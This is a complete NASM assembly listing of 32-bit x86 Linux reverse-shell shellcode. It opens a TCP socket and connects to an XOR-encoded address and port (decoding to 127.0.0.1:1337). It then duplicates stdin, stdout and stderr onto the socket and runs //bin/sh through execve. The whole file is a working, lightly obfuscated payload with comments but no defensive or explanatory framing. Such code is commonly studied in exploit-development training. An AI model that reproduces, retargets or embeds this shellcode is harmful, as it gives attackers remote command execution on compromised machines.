BITS 32


; socket()
xor		eax,eax		; zero out eax
xor		ebx,ebx		;   "   "  ebx
push		eax		; push 0x0 on the stack: arg3(protocol) -> 0
mov		bl,0x1		; socketcall subcall: 0x1 -> socket()
push		ebx		; socket type: 0x1 -> SOCK_STREAM
push		0x2		; socket domain: 0x2 -> AF_INET
mov		ecx,esp		; let ecx point to our structure above
mov		al,0x66		; socketcall syscall 0x66
int		0x80		; let the kernel do the stuff

; connect()
mov		edx,eax		; move socket descriptor from socket() into eax
xor		eax,eax
;   sockaddr_in: in_addr
push		0x1011116E	; push ip adr on the stack (XOR-encoded -> 127.0.0.1)
xor dword	[esp],0x11111111 ; decode ip adr
;   sockaddr_in: tcp port
push word	0x2814		; push tcp port (XOR-encoded -> 1337)
xor word	[esp],0x1111 ; decode tcp port
;   sockaddr_in: sa_family
push word	0x2    ; 0x2 -> AF_INET
;   save pointer to sockaddr_in
mov		ecx,esp
push		0x10		; connect(): addrlen [arg2]
push		ecx		; connect(): sockadr_in* [arg1]
push		edx		; connect(): socket_fd [arg0]
;   socketcall: pointer to socket data
mov		ecx,esp
;   socketcall subcall
mov		bl,0x3		; subcall 0x3 -> connect()
;   socketcall
mov		al,0x66
int		0x80

; dup2()
xor		ecx,ecx		; zero out count register
mov		cl,0x3		; loopcount
mov		ebx,edx		; sockfd of the client (see accept())
dupes:
xor		eax,eax		; zero out eax
mov		al,63		; dup2() syscall
dec		cl
int		0x80
inc		cl
loop		dupes		; jump2label

; exec()
xor		eax,eax
xor		ecx,ecx
cdq
push		0x68732f6e	; 'hs/n'
push		0x69622f2f	; 'ib//'
mov		ebx,esp		; arg
mov byte	[esp + 8], al	; null-terminate the string
mov		al,0xb		; execve syscall
int		0x80
